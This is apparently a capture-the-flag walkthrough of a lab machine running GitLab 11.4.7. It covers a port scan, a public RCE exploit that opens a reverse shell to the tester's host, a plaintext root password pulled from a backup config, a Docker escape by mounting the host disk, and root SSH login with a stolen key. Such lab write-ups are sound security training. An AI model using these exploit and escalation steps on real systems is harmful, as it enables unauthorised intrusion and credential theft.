## Reconnaissance
### Initial Port Scan
```bash
sudo /opt/nmapAutomator/nmapAutomator.sh 10.10.10.220 All
```
* Result

![1_OpenPorts](https://user-images.githubusercontent.com/53956303/132597789-346cd1f9-dab6-4d27-8977-9a045746cd0e.jpg)
## Enumeration
## Port 5080
![2_Port5080](https://user-images.githubusercontent.com/53956303/132597794-fc43eea3-e531-40d7-b79d-dbab4c3a108f.jpg)
* From Port 5080, GitLab Login page is found
### Enumerate robots.txt
* Since the NmapAutomator Basic scan reveals "robots.txt", enumerate this file for some information
```bash
curl http://10.10.10.220:5080/robots.txt
```
* Result

![3_robots](https://user-images.githubusercontent.com/53956303/132597973-3c210cad-38e9-4932-8884-45f93021dc71.jpg)
* From the result, some directories are found
  * However, nothing interesting at this moment
#### Resiger a user
* Make a user as `test123 / password123`
![4_gitlab](https://user-images.githubusercontent.com/53956303/132598036-deaaa5fc-64e2-4434-b133-51a6fdaedf3e.jpg)
### Identify the Version Number
* On the `/help`, a version number for Git Lab can be found
  * `GitLab Community Edition 11.4.7`

![image](https://user-images.githubusercontent.com/53956303/132599665-a0496681-1197-4670-aa16-785a21f12685.png)

## Exploitation
### GitLab 11.4.7 Remote code execution
* An exploit for exact version number is found

|[Git Lab 11.4.7 Remote Code Execution](https://github.com/ctrlsam/GitLab-11.4.7-RCE)|
|----|

### Initial Foothold
#### Open a Netcat Listener
```bash
sudo nc -lnvp 443
```
#### Execute the exploit
```bash
python3 exploit.py -n test123 -p password123 -g http://10.10.10.220 -l 10.10.14.12 -P 443
```
* As a result, a reverse shell as "git" is open

![5_iniitla_shell](https://user-images.githubusercontent.com/53956303/132599878-006c0665-ffdc-4d65-a0e3-b57b37aab749.jpg)
### Getting a Stable Shell
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl + z
stty raw -echo
fg
```
## Privilege Escalation
### Run linpea.sh
* Download from the Kali
```bash
./linpea.sh
```
![6_result](https://user-images.githubusercontent.com/53956303/132600240-bc6b6632-50dd-43ae-b46b-31e91631fd21.jpg)
* From the result, an interesting directory `/opt/backup`, which contains a lot of files realted to GitLab, is found

### Enumerate `/opt/backup`
* From the directory an interesting file "gitlab.rb" is found
    * Try to find a password
```bash
cat gitlab.rb | grep password
```
* From the file, a possible password is found

![7_filesstem](https://user-images.githubusercontent.com/53956303/132600532-355a4288-7041-4884-ae37-3d45cb4b96a1.jpg)
### Change user to root
```bash
su root
#password: wW59U!ZKMbG9+*#h
```
* As a result, a a root user in a docker container is open

### Escape Docker container; Mounting the hosts disk to get root
```bash
mkdir /mnt/sda2
mount /dev/sda2 /mnt/sda2
cd /mnt/sda2
```
* As a result, the root file system is mounted

![7_filesstem](https://user-images.githubusercontent.com/53956303/132600597-e4233c46-b582-46d7-a525-b4880dac710c.jpg)
### Connect SSH as Root
* From the `/mnt/sda2/root/.ssh`, a private key for "root" user is found
    * Copy it to Kali and connect SSH as root

![8_id_rsa](https://user-images.githubusercontent.com/53956303/132600608-6dcfcd30-2dd9-4f1b-9287-ed7620087603.jpg)
```bash
#Kali
chmod 600 id_rsa
ssh -i id_rsa root@10.10.10.220
```
* As a result, a SSH shell as root is open

![9_root_LI](https://user-images.githubusercontent.com/53956303/132600798-442f80f3-0d22-4066-8c04-297c6383e9cf.jpg)
